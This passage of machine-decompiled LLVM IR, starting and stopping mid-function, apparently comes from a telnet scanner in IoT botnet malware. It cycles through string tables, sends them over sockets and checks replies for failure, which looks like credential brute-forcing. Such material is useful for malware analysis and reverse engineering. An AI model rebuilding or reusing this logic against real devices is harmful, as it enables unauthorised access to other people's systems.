  %v2_804d719 = inttoptr i32 %v1_804d719 to i32*
  store i32 %v0_804d719, i32* %v2_804d719, align 4
  %v0_804d71c = load i32, i32* %stack_var_-332, align 4
  %v1_804d71c = load i32, i32* %stack_var_-328, align 4
  %v2_804d71c = inttoptr i32 %v0_804d71c to i32*
  %v3_804d71c = call i32 @advance_state(i32* %v2_804d71c, i32 %v1_804d71c)
  store i32 %v3_804d71c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804d726:                             ; preds = %dec_label_pc_804d546
  %v13_804d726 = icmp eq i32 %v5_804d5f7, -1
  %v1_804d72a = icmp eq i1 %v13_804d726, false
  store i32 %v1_804d112, i32* @edx, align 4
  br i1 %v1_804d72a, label %dec_label_pc_804d752, label %dec_label_pc_804d72c

dec_label_pc_804d72c:                             ; preds = %dec_label_pc_804d726
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804d745 = load i32, i32* @esp, align 4
  %v2_804d745 = inttoptr i32 %v1_804d745 to i32*
  store i32 %v2_804d122, i32* %v2_804d745, align 4
  %v1_804d748 = call i32 @reset_telstate(i32 %v5_804d5f7)
  store i32 %v1_804d748, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804d752:                             ; preds = %dec_label_pc_804d726
  store i32 %v1_804d124, i32* %eax.global-to-local, align 4
  %v2_804d76d = load i32, i32* %v1_804d127, align 4
  store i32 %v2_804d76d, i32* %eax.global-to-local, align 4
  %v1_804d76f = add i32 %v2_804d76d, 5
  store i32 %v1_804d76f, i32* @ebx, align 4
  %v0_804d772 = load i32, i32* @esp, align 4
  %v1_804d772 = inttoptr i32 %v0_804d772 to i32*
  store i32 0, i32* %v1_804d772, align 4
  %v1_804d779 = inttoptr i32 %v5_804d5f7 to i32*
  %v2_804d779 = call i32 @__GI_time(i32* %v1_804d779)
  store i32 %v2_804d779, i32* %eax.global-to-local, align 4
  %v0_804d77e = load i32, i32* @ebx, align 4
  %v7_804d77e = icmp ult i32 %v0_804d77e, %v2_804d779
  %v1_804d780 = icmp eq i1 %v7_804d77e, false
  br i1 %v1_804d780, label %dec_label_pc_804e0dc, label %dec_label_pc_804d786

dec_label_pc_804d786:                             ; preds = %dec_label_pc_804d752
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804d79f = load i32, i32* @esp, align 4
  %v2_804d79f = inttoptr i32 %v1_804d79f to i32*
  store i32 %v2_804d122, i32* %v2_804d79f, align 4
  %v0_804d7a2 = load i32, i32* %stack_var_-332, align 4
  %v1_804d7a2 = call i32 @reset_telstate(i32 %v0_804d7a2)
  store i32 %v1_804d7a2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804d7ac:                             ; preds = %dec_label_pc_804d15a
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  %v1_804d7c4 = add i32 %v2_804d122, 24
  store i32 %v1_804d7c4, i32* %eax.global-to-local, align 4
  %v1_804d7c7 = inttoptr i32 %v1_804d7c4 to i32*
  %v2_804d7c7 = load i32, i32* %v1_804d7c7, align 4
  store i32 %v2_804d7c7, i32* @ebx, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804d7df = inttoptr i32 %v2_804d122 to i32*
  %v4_804d7df = load i32, i32* %v3_804d7df, align 4
  store i32 %v4_804d7df, i32* %edx.global-to-local, align 4
  %v0_804d7e2 = load i32, i32* @esp, align 4
  %v1_804d7e2 = add i32 %v0_804d7e2, 16
  %v2_804d7e2 = inttoptr i32 %v1_804d7e2 to i32*
  store i32 134595052, i32* %v2_804d7e2, align 4
  %v0_804d7ea = load i32, i32* @esp, align 4
  %v1_804d7ea = add i32 %v0_804d7ea, 12
  %v2_804d7ea = inttoptr i32 %v1_804d7ea to i32*
  store i32 512, i32* %v2_804d7ea, align 4
  %v0_804d7f2 = load i32, i32* @ebx, align 4
  %v1_804d7f2 = load i32, i32* @esp, align 4
  %v2_804d7f2 = add i32 %v1_804d7f2, 8
  %v3_804d7f2 = inttoptr i32 %v2_804d7f2 to i32*
  store i32 %v0_804d7f2, i32* %v3_804d7f2, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804d7f9 = load i32, i32* @esp, align 4
  %v2_804d7f9 = add i32 %v1_804d7f9, 4
  %v3_804d7f9 = inttoptr i32 %v2_804d7f9 to i32*
  store i32 %arg1, i32* %v3_804d7f9, align 4
  %v0_804d7fd = load i32, i32* %edx.global-to-local, align 4
  %v1_804d7fd = load i32, i32* @esp, align 4
  %v2_804d7fd = inttoptr i32 %v1_804d7fd to i32*
  store i32 %v0_804d7fd, i32* %v2_804d7fd, align 4
  %v1_804d800 = call i32 @read_until_response(i32 %v6_804d170)
  %v1_804d805 = icmp eq i32 %v1_804d800, 0
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  br i1 %v1_804d805, label %dec_label_pc_804d892, label %dec_label_pc_804d80d

dec_label_pc_804d80d:                             ; preds = %dec_label_pc_804d7ac
  store i32 %v1_804d7c4, i32* %eax.global-to-local, align 4
  %v2_804d828 = load i32, i32* %v1_804d7c7, align 4
  store i32 %v2_804d828, i32* %eax.global-to-local, align 4
  %v1_804d82a = load i32, i32* @esp, align 4
  %v2_804d82a = inttoptr i32 %v1_804d82a to i32*
  store i32 %v2_804d828, i32* %v2_804d82a, align 4
  %v0_804d82d = load i32, i32* %stack_var_-332, align 4
  %v1_804d82d = call i32 @contains_fail(i32 %v0_804d82d)
  %v1_804d832 = icmp eq i32 %v1_804d82d, 0
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v0_804d87d = load i32, i32* @esp, align 4
  %v1_804d87d = add i32 %v0_804d87d, 4
  %v2_804d87d = inttoptr i32 %v1_804d87d to i32*
  br i1 %v1_804d832, label %dec_label_pc_804d864, label %dec_label_pc_804d836

dec_label_pc_804d836:                             ; preds = %dec_label_pc_804d80d
  store i32 0, i32* %v2_804d87d, align 4
  %v0_804d857 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d857 = load i32, i32* @esp, align 4
  %v2_804d857 = inttoptr i32 %v1_804d857 to i32*
  store i32 %v0_804d857, i32* %v2_804d857, align 4
  %v0_804d85a = load i32, i32* %stack_var_-332, align 4
  %v1_804d85a = load i32, i32* %stack_var_-328, align 4
  %v2_804d85a = inttoptr i32 %v0_804d85a to i32*
  %v3_804d85a = call i32 @advance_state(i32* %v2_804d85a, i32 %v1_804d85a)
  store i32 %v3_804d85a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804d864:                             ; preds = %dec_label_pc_804d80d
  store i32 3, i32* %v2_804d87d, align 4
  %v0_804d885 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d885 = load i32, i32* @esp, align 4
  %v2_804d885 = inttoptr i32 %v1_804d885 to i32*
  store i32 %v0_804d885, i32* %v2_804d885, align 4
  %v0_804d888 = load i32, i32* %stack_var_-332, align 4
  %v1_804d888 = load i32, i32* %stack_var_-328, align 4
  %v2_804d888 = inttoptr i32 %v0_804d888 to i32*
  %v3_804d888 = call i32 @advance_state(i32* %v2_804d888, i32 %v1_804d888)
  store i32 %v3_804d888, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804d892:                             ; preds = %dec_label_pc_804d7ac
  store i32 %v1_804d124, i32* %eax.global-to-local, align 4
  %v2_804d8ad = load i32, i32* %v1_804d127, align 4
  store i32 %v2_804d8ad, i32* %eax.global-to-local, align 4
  %v1_804d8af = add i32 %v2_804d8ad, 7
  store i32 %v1_804d8af, i32* @ebx, align 4
  %v0_804d8b2 = load i32, i32* @esp, align 4
  %v1_804d8b2 = inttoptr i32 %v0_804d8b2 to i32*
  store i32 0, i32* %v1_804d8b2, align 4
  %v0_804d8b9 = load i32, i32* %stack_var_-332, align 4
  %v1_804d8b9 = inttoptr i32 %v0_804d8b9 to i32*
  %v2_804d8b9 = call i32 @__GI_time(i32* %v1_804d8b9)
  store i32 %v2_804d8b9, i32* %eax.global-to-local, align 4
  %v0_804d8be = load i32, i32* @ebx, align 4
  %v7_804d8be = icmp ult i32 %v0_804d8be, %v2_804d8b9
  %v1_804d8c0 = icmp eq i1 %v7_804d8be, false
  br i1 %v1_804d8c0, label %dec_label_pc_804e0dc, label %dec_label_pc_804d8c6

dec_label_pc_804d8c6:                             ; preds = %dec_label_pc_804d892
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804d8df = load i32, i32* @esp, align 4
  %v2_804d8df = inttoptr i32 %v1_804d8df to i32*
  store i32 %v2_804d122, i32* %v2_804d8df, align 4
  %v0_804d8e2 = load i32, i32* %stack_var_-332, align 4
  %v1_804d8e2 = call i32 @reset_telstate(i32 %v0_804d8e2)
  store i32 %v1_804d8e2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804d8ec:                             ; preds = %dec_label_pc_804d15a
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804d902 = add i32 %v2_804d2e8, %v2_804d120
  %v4_804d902 = inttoptr i32 %v3_804d902 to i8*
  %v5_804d902 = load i8, i8* %v4_804d902, align 2
  %v6_804d902 = zext i8 %v5_804d902 to i32
  store i32 %v6_804d902, i32* %eax.global-to-local, align 4
  %v1_804d90a = mul nuw nsw i32 %v6_804d902, 4
  %v2_804d90a = add nuw nsw i32 %v1_804d90a, 134594980
  %v3_804d90a = inttoptr i32 %v2_804d90a to i32*
  %v4_804d90a = load i32, i32* %v3_804d90a, align 4
  %v1_804d91c = and i32 %v4_804d90a, -256
  store i32 %v1_804d91c, i32* %eax.global-to-local, align 4
  %v4_804d91f = inttoptr i32 %v4_804d90a to i8*
  store i32 %v4_804d90a, i32* @edi, align 4
  %v3_804d925 = call i32 @_strlen(i8* %v4_804d91f)
  store i32 %v3_804d925, i32* @esi, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v5_804d944 = load i8, i8* %v4_804d902, align 2
  %v6_804d944 = zext i8 %v5_804d944 to i32
  store i32 %v6_804d944, i32* %eax.global-to-local, align 4
  %v1_804d94c = mul nuw nsw i32 %v6_804d944, 4
  %v2_804d94c = add nuw nsw i32 %v1_804d94c, 134594980
  %v3_804d94c = inttoptr i32 %v2_804d94c to i32*
  %v4_804d94c = load i32, i32* %v3_804d94c, align 4
  store i32 %v4_804d94c, i32* @ebx, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804d969 = inttoptr i32 %v2_804d122 to i32*
  %v4_804d969 = load i32, i32* %v3_804d969, align 4
  store i32 %v4_804d969, i32* %eax.global-to-local, align 4
  %v0_804d96c = load i32, i32* @esp, align 4
  %v1_804d96c = add i32 %v0_804d96c, 12
  %v2_804d96c = inttoptr i32 %v1_804d96c to i32*
  store i32 16384, i32* %v2_804d96c, align 4
  %v0_804d974 = load i32, i32* @esi, align 4
  %v1_804d974 = load i32, i32* @esp, align 4
  %v2_804d974 = add i32 %v1_804d974, 8
  %v3_804d974 = inttoptr i32 %v2_804d974 to i32*
  store i32 %v0_804d974, i32* %v3_804d974, align 4
  %v0_804d978 = load i32, i32* @ebx, align 4
  %v1_804d978 = load i32, i32* @esp, align 4
  %v2_804d978 = add i32 %v1_804d978, 4
  %v3_804d978 = inttoptr i32 %v2_804d978 to i32*
  store i32 %v0_804d978, i32* %v3_804d978, align 4
  %v0_804d97c = load i32, i32* %eax.global-to-local, align 4
  %v1_804d97c = load i32, i32* @esp, align 4
  %v2_804d97c = inttoptr i32 %v1_804d97c to i32*
  store i32 %v0_804d97c, i32* %v2_804d97c, align 4
  %v4_804d97f = call i32 @__libc_send(i32 %v4_804d90a, i32 %v2_804d02b, i32 %v6_804d170, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804d97f, i32* %eax.global-to-local, align 4
  %v2_804d984 = icmp slt i32 %v4_804d97f, 0
  %v1_804d986 = icmp eq i1 %v2_804d984, false
  store i32 %v1_804d112, i32* @edx, align 4
  br i1 %v1_804d986, label %dec_label_pc_804d9ae, label %dec_label_pc_804d988

dec_label_pc_804d988:                             ; preds = %dec_label_pc_804d8ec
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804d9a1 = load i32, i32* @esp, align 4
  %v2_804d9a1 = inttoptr i32 %v1_804d9a1 to i32*
  store i32 %v2_804d122, i32* %v2_804d9a1, align 4
  %v1_804d9a4 = call i32 @reset_telstate(i32 %v4_804d90a)
  store i32 %v1_804d9a4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804d9ae:                             ; preds = %dec_label_pc_804d8ec
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804d9c4 = load i32, i32* %v3_804d969, align 4
  store i32 %v4_804d9c4, i32* %eax.global-to-local, align 4
  %v0_804d9c7 = load i32, i32* @esp, align 4
  %v1_804d9c7 = add i32 %v0_804d9c7, 12
  %v2_804d9c7 = inttoptr i32 %v1_804d9c7 to i32*
  store i32 16384, i32* %v2_804d9c7, align 4
  %v0_804d9cf = load i32, i32* @esp, align 4
  %v1_804d9cf = add i32 %v0_804d9cf, 8
  %v2_804d9cf = inttoptr i32 %v1_804d9cf to i32*
  store i32 2, i32* %v2_804d9cf, align 4
  %v0_804d9d7 = load i32, i32* @esp, align 4
  %v1_804d9d7 = add i32 %v0_804d9d7, 4
  %v2_804d9d7 = inttoptr i32 %v1_804d9d7 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_805936f.256 to i32), i32* %v2_804d9d7, align 4
  %v0_804d9df = load i32, i32* %eax.global-to-local, align 4
  %v1_804d9df = load i32, i32* @esp, align 4
  %v2_804d9df = inttoptr i32 %v1_804d9df to i32*
  store i32 %v0_804d9df, i32* %v2_804d9df, align 4
  %v4_804d9e2 = call i32 @__libc_send(i32 %v4_804d90a, i32 %v2_804d02b, i32 %v6_804d170, i32 ptrtoint (i32* @0 to i32))
  %v2_804d9e7 = icmp slt i32 %v4_804d9e2, 0
  %v1_804d9e9 = icmp eq i1 %v2_804d9e7, false
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v0_804da2a = load i32, i32* @esp, align 4
  br i1 %v1_804d9e9, label %dec_label_pc_804da11, label %dec_label_pc_804d9eb

dec_label_pc_804d9eb:                             ; preds = %dec_label_pc_804d9ae
  %v2_804da04 = inttoptr i32 %v0_804da2a to i32*
  store i32 %v2_804d122, i32* %v2_804da04, align 4
  %v1_804da07 = call i32 @reset_telstate(i32 %v4_804d90a)
  store i32 %v1_804da07, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804da11:                             ; preds = %dec_label_pc_804d9ae
  %v1_804da2a = add i32 %v0_804da2a, 4
  %v2_804da2a = inttoptr i32 %v1_804da2a to i32*
  store i32 4, i32* %v2_804da2a, align 4
  %v0_804da32 = load i32, i32* %eax.global-to-local, align 4
  %v1_804da32 = load i32, i32* @esp, align 4
  %v2_804da32 = inttoptr i32 %v1_804da32 to i32*
  store i32 %v0_804da32, i32* %v2_804da32, align 4
  %v2_804da35 = inttoptr i32 %v4_804d90a to i32*
  %v3_804da35 = call i32 @advance_state(i32* %v2_804da35, i32 %v2_804d02b)
  store i32 %v3_804da35, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804da3f:                             ; preds = %dec_label_pc_804d15a
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  %v1_804da57 = add i32 %v2_804d122, 24
  store i32 %v1_804da57, i32* %eax.global-to-local, align 4
  %v1_804da5a = inttoptr i32 %v1_804da57 to i32*
  %v2_804da5a = load i32, i32* %v1_804da5a, align 4
  store i32 %v2_804da5a, i32* @ebx, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804da72 = inttoptr i32 %v2_804d122 to i32*
  %v4_804da72 = load i32, i32* %v3_804da72, align 4
  store i32 %v4_804da72, i32* %edx.global-to-local, align 4
  %v0_804da75 = load i32, i32* @esp, align 4
  %v1_804da75 = add i32 %v0_804da75, 16
  %v2_804da75 = inttoptr i32 %v1_804da75 to i32*
  store i32 ptrtoint (i32* @global_var_805c1ec to i32), i32* %v2_804da75, align 4
  %v0_804da7d = load i32, i32* @esp, align 4
  %v1_804da7d = add i32 %v0_804da7d, 12
  %v2_804da7d = inttoptr i32 %v1_804da7d to i32*
  store i32 512, i32* %v2_804da7d, align 4
  %v0_804da85 = load i32, i32* @ebx, align 4
  %v1_804da85 = load i32, i32* @esp, align 4
  %v2_804da85 = add i32 %v1_804da85, 8
  %v3_804da85 = inttoptr i32 %v2_804da85 to i32*
  store i32 %v0_804da85, i32* %v3_804da85, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804da8c = load i32, i32* @esp, align 4
  %v2_804da8c = add i32 %v1_804da8c, 4
  %v3_804da8c = inttoptr i32 %v2_804da8c to i32*
  store i32 %arg1, i32* %v3_804da8c, align 4
  %v0_804da90 = load i32, i32* %edx.global-to-local, align 4
  %v1_804da90 = load i32, i32* @esp, align 4
  %v2_804da90 = inttoptr i32 %v1_804da90 to i32*
  store i32 %v0_804da90, i32* %v2_804da90, align 4
  %v1_804da93 = call i32 @read_until_response(i32 %v6_804d170)
  %v1_804da98 = icmp eq i32 %v1_804da93, 0
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  br i1 %v1_804da98, label %dec_label_pc_804db25, label %dec_label_pc_804daa0

dec_label_pc_804daa0:                             ; preds = %dec_label_pc_804da3f
  store i32 %v1_804da57, i32* %eax.global-to-local, align 4
  %v2_804dabb = load i32, i32* %v1_804da5a, align 4
  store i32 %v2_804dabb, i32* %eax.global-to-local, align 4
  %v1_804dabd = load i32, i32* @esp, align 4
  %v2_804dabd = inttoptr i32 %v1_804dabd to i32*
  store i32 %v2_804dabb, i32* %v2_804dabd, align 4
  %v1_804dac0 = call i32 @contains_fail(i32 %stack_var_-624.247)
  %v1_804dac5 = icmp eq i32 %v1_804dac0, 0
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v0_804db10 = load i32, i32* @esp, align 4
  %v1_804db10 = add i32 %v0_804db10, 4
  %v2_804db10 = inttoptr i32 %v1_804db10 to i32*
  br i1 %v1_804dac5, label %dec_label_pc_804daf7, label %dec_label_pc_804dac9

dec_label_pc_804dac9:                             ; preds = %dec_label_pc_804daa0
  store i32 0, i32* %v2_804db10, align 4
  %v0_804daea = load i32, i32* %eax.global-to-local, align 4
  %v1_804daea = load i32, i32* @esp, align 4
  %v2_804daea = inttoptr i32 %v1_804daea to i32*
  store i32 %v0_804daea, i32* %v2_804daea, align 4
  %v2_804daed = inttoptr i32 %stack_var_-624.247 to i32*
  %v3_804daed = call i32 @advance_state(i32* %v2_804daed, i32 %v2_804d02b)
  store i32 %v3_804daed, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804daf7:                             ; preds = %dec_label_pc_804daa0
  store i32 5, i32* %v2_804db10, align 4
  %v0_804db18 = load i32, i32* %eax.global-to-local, align 4
  %v1_804db18 = load i32, i32* @esp, align 4
  %v2_804db18 = inttoptr i32 %v1_804db18 to i32*
  store i32 %v0_804db18, i32* %v2_804db18, align 4
  %v2_804db1b = inttoptr i32 %stack_var_-624.247 to i32*
  %v3_804db1b = call i32 @advance_state(i32* %v2_804db1b, i32 %v2_804d02b)
  store i32 %v3_804db1b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804db25:                             ; preds = %dec_label_pc_804da3f
  store i32 %v1_804d124, i32* %eax.global-to-local, align 4
  %v2_804db40 = load i32, i32* %v1_804d127, align 4
  store i32 %v2_804db40, i32* %eax.global-to-local, align 4
  %v1_804db42 = add i32 %v2_804db40, 3
  store i32 %v1_804db42, i32* @ebx, align 4
  %v0_804db45 = load i32, i32* @esp, align 4
  %v1_804db45 = inttoptr i32 %v0_804db45 to i32*
  store i32 0, i32* %v1_804db45, align 4
  %v1_804db4c = inttoptr i32 %stack_var_-624.247 to i32*
  %v2_804db4c = call i32 @__GI_time(i32* %v1_804db4c)
  store i32 %v2_804db4c, i32* %eax.global-to-local, align 4
  %v0_804db51 = load i32, i32* @ebx, align 4
  %v7_804db51 = icmp ult i32 %v0_804db51, %v2_804db4c
  %v1_804db53 = icmp eq i1 %v7_804db51, false
  br i1 %v1_804db53, label %dec_label_pc_804e0dc, label %dec_label_pc_804db59

dec_label_pc_804db59:                             ; preds = %dec_label_pc_804db25
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804db72 = load i32, i32* @esp, align 4
  %v2_804db72 = inttoptr i32 %v1_804db72 to i32*
  store i32 %v2_804d122, i32* %v2_804db72, align 4
  %v1_804db75 = call i32 @reset_telstate(i32 %stack_var_-624.247)
  store i32 %v1_804db75, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804db7f:                             ; preds = %dec_label_pc_804d15a
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804db95 = add i32 %v2_804d2a1, %v2_804d120
  %v4_804db95 = inttoptr i32 %v3_804db95 to i8*
  %v5_804db95 = load i8, i8* %v4_804db95, align 1
  %v6_804db95 = zext i8 %v5_804db95 to i32
  store i32 %v6_804db95, i32* %eax.global-to-local, align 4
  %v1_804db9d = mul nuw nsw i32 %v6_804db95, 4
  %v2_804db9d = add nuw nsw i32 %v1_804db9d, 134594992
  %v3_804db9d = inttoptr i32 %v2_804db9d to i32*
  %v4_804db9d = load i32, i32* %v3_804db9d, align 4
  %v1_804dbaf = and i32 %v4_804db9d, -256
  store i32 %v1_804dbaf, i32* %eax.global-to-local, align 4
  %v4_804dbb2 = inttoptr i32 %v4_804db9d to i8*
  store i32 %v4_804db9d, i32* @edi, align 4
  %v3_804dbb8 = call i32 @_strlen(i8* %v4_804dbb2)
  store i32 %v3_804dbb8, i32* @esi, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v5_804dbd7 = load i8, i8* %v4_804db95, align 1
  %v6_804dbd7 = zext i8 %v5_804dbd7 to i32
  store i32 %v6_804dbd7, i32* %eax.global-to-local, align 4
  %v1_804dbdf = mul nuw nsw i32 %v6_804dbd7, 4
  %v2_804dbdf = add nuw nsw i32 %v1_804dbdf, 134594992
  %v3_804dbdf = inttoptr i32 %v2_804dbdf to i32*
  %v4_804dbdf = load i32, i32* %v3_804dbdf, align 4
  store i32 %v4_804dbdf, i32* @ebx, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804dbfc = inttoptr i32 %v2_804d122 to i32*
  %v4_804dbfc = load i32, i32* %v3_804dbfc, align 4
  store i32 %v4_804dbfc, i32* %eax.global-to-local, align 4
  %v0_804dbff = load i32, i32* @esp, align 4
  %v1_804dbff = add i32 %v0_804dbff, 12
  %v2_804dbff = inttoptr i32 %v1_804dbff to i32*
  store i32 16384, i32* %v2_804dbff, align 4
  %v0_804dc07 = load i32, i32* @esi, align 4
  %v1_804dc07 = load i32, i32* @esp, align 4
  %v2_804dc07 = add i32 %v1_804dc07, 8
  %v3_804dc07 = inttoptr i32 %v2_804dc07 to i32*
  store i32 %v0_804dc07, i32* %v3_804dc07, align 4
  %v0_804dc0b = load i32, i32* @ebx, align 4
  %v1_804dc0b = load i32, i32* @esp, align 4
  %v2_804dc0b = add i32 %v1_804dc0b, 4
  %v3_804dc0b = inttoptr i32 %v2_804dc0b to i32*
  store i32 %v0_804dc0b, i32* %v3_804dc0b, align 4
  %v0_804dc0f = load i32, i32* %eax.global-to-local, align 4
  %v1_804dc0f = load i32, i32* @esp, align 4
  %v2_804dc0f = inttoptr i32 %v1_804dc0f to i32*
  store i32 %v0_804dc0f, i32* %v2_804dc0f, align 4
  %v4_804dc12 = call i32 @__libc_send(i32 %v4_804db9d, i32 %stack_var_-624.247, i32 %v2_804d02b, i32 %v6_804d170)
  store i32 %v4_804dc12, i32* %eax.global-to-local, align 4
  %v2_804dc17 = icmp slt i32 %v4_804dc12, 0
  %v1_804dc19 = icmp eq i1 %v2_804dc17, false
  store i32 %v1_804d112, i32* @edx, align 4
  br i1 %v1_804dc19, label %dec_label_pc_804dc41, label %dec_label_pc_804dc1b

dec_label_pc_804dc1b:                             ; preds = %dec_label_pc_804db7f
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804dc34 = load i32, i32* @esp, align 4
  %v2_804dc34 = inttoptr i32 %v1_804dc34 to i32*
  store i32 %v2_804d122, i32* %v2_804dc34, align 4
  %v1_804dc37 = call i32 @reset_telstate(i32 %v4_804db9d)
  store i32 %v1_804dc37, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804dc41:                             ; preds = %dec_label_pc_804db7f
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804dc57 = load i32, i32* %v3_804dbfc, align 4
  store i32 %v4_804dc57, i32* %eax.global-to-local, align 4
  %v0_804dc5a = load i32, i32* @esp, align 4
  %v1_804dc5a = add i32 %v0_804dc5a, 12
  %v2_804dc5a = inttoptr i32 %v1_804dc5a to i32*
  store i32 16384, i32* %v2_804dc5a, align 4
  %v0_804dc62 = load i32, i32* @esp, align 4
  %v1_804dc62 = add i32 %v0_804dc62, 8
  %v2_804dc62 = inttoptr i32 %v1_804dc62 to i32*
  store i32 2, i32* %v2_804dc62, align 4
  %v0_804dc6a = load i32, i32* @esp, align 4
  %v1_804dc6a = add i32 %v0_804dc6a, 4
  %v2_804dc6a = inttoptr i32 %v1_804dc6a to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_805936f.256 to i32), i32* %v2_804dc6a, align 4
  %v0_804dc72 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dc72 = load i32, i32* @esp, align 4
  %v2_804dc72 = inttoptr i32 %v1_804dc72 to i32*
  store i32 %v0_804dc72, i32* %v2_804dc72, align 4
  %v4_804dc75 = call i32 @__libc_send(i32 %v4_804db9d, i32 %stack_var_-624.247, i32 %v2_804d02b, i32 %v6_804d170)
  %v2_804dc7a = icmp slt i32 %v4_804dc75, 0
  %v1_804dc7c = icmp eq i1 %v2_804dc7a, false
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v0_804dcbd = load i32, i32* @esp, align 4
  br i1 %v1_804dc7c, label %dec_label_pc_804dca4, label %dec_label_pc_804dc7e

dec_label_pc_804dc7e:                             ; preds = %dec_label_pc_804dc41
  %v2_804dc97 = inttoptr i32 %v0_804dcbd to i32*
  store i32 %v2_804d122, i32* %v2_804dc97, align 4
  %v1_804dc9a = call i32 @reset_telstate(i32 %v4_804db9d)
  store i32 %v1_804dc9a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804dca4:                             ; preds = %dec_label_pc_804dc41
  %v1_804dcbd = add i32 %v0_804dcbd, 4
  %v2_804dcbd = inttoptr i32 %v1_804dcbd to i32*
  store i32 6, i32* %v2_804dcbd, align 4
  %v0_804dcc5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dcc5 = load i32, i32* @esp, align 4
  %v2_804dcc5 = inttoptr i32 %v1_804dcc5 to i32*
  store i32 %v0_804dcc5, i32* %v2_804dcc5, align 4
  %v2_804dcc8 = inttoptr i32 %v4_804db9d to i32*
  %v3_804dcc8 = call i32 @advance_state(i32* %v2_804dcc8, i32 %stack_var_-624.247)
  store i32 %v3_804dcc8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804dcd2:                             ; preds = %dec_label_pc_804d15a
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  %v1_804dcea = add i32 %v2_804d122, 24
  store i32 %v1_804dcea, i32* %eax.global-to-local, align 4
  %v1_804dced = inttoptr i32 %v1_804dcea to i32*
  %v2_804dced = load i32, i32* %v1_804dced, align 4
  store i32 %v2_804dced, i32* @ebx, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804dd05 = inttoptr i32 %v2_804d122 to i32*
  %v4_804dd05 = load i32, i32* %v3_804dd05, align 4
  store i32 %v4_804dd05, i32* %edx.global-to-local, align 4
  %v0_804dd08 = load i32, i32* @esp, align 4
  %v1_804dd08 = add i32 %v0_804dd08, 16
  %v2_804dd08 = inttoptr i32 %v1_804dd08 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_805c240.257 to i32), i32* %v2_804dd08, align 4
  %v0_804dd10 = load i32, i32* @esp, align 4
  %v1_804dd10 = add i32 %v0_804dd10, 12
  %v2_804dd10 = inttoptr i32 %v1_804dd10 to i32*
  store i32 512, i32* %v2_804dd10, align 4
  %v0_804dd18 = load i32, i32* @ebx, align 4
  %v1_804dd18 = load i32, i32* @esp, align 4
